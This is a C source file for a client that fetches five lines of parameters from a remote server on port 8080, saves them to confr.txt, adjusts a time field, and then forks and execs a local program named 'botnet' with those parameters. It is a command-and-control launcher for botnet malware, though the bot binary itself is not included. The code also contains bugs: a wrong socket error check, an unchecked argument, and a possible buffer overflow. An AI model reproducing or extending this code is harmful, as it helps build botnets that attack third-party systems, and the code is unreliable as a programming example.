#include <stdio.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#define PORT 8080

int main(int argc, char* argv[]){

  int sock = 0, valread;
  struct sockaddr_in serv_addr;
  //int addrlen = sizeof(address);
  char buffer[2048] = {0};

  if((sock = socket(AF_INET, SOCK_STREAM, 0)) == 0){
    printf("%s\n", "Unable to open connection");
    return -1;
  }

  memset(&serv_addr, '0', sizeof(serv_addr));

  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);

  if(inet_pton(AF_INET, argv[1], &serv_addr.sin_addr) <= 0){

    printf("%s\n", "Invalid IP Address");
    return -2;

  }

    if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0){

      printf("%s\n", "Unable to connect");
      return -3;

    }

  FILE* fl;
  fl = fopen("confr.txt", "w");
  while(read(sock, buffer, 2048) > 0){
      //printf("%s\n", buffer);
      fprintf(fl, "%s", buffer);

  }

  fclose(fl);
  printf("%s\n", "Message received");

  FILE* fk = fopen("confr.txt", "r");
  char buffr[255];
  int counter = 0;
  char new_data[5][255];


  while(fgets(buffr, 255, (FILE*) fk)) {
      //printf("%s\n", buffr);
      strcpy(new_data[counter], buffr);
      counter ++;
  }

  fclose(fk);
  time_t times;
  times = time(NULL);
  int tim = atoi(new_data[2]) + times;
  //printf("%d\n", tim);
  char buf[255];
  sprintf(buf, "%d", tim);
  strcpy(new_data[2], buf);


  printf("%s\n", "Here");
    pid_t pid = fork();

    if(pid == -1){

        printf("%s\n", "Failed to fork");
        return 1;

    }else if (pid == 0){

      printf("%s\n", "Run bot");
      execl("./cmake-build-debug/botnet", "botnet", (const char*)new_data[0], (const char*)new_data[1], (const char*)new_data[2], (const char*)new_data[3], (const char*)new_data[4], NULL);

    }else{
      int status;
      while (wait(&status) != pid){}

    }

  return 0;
}
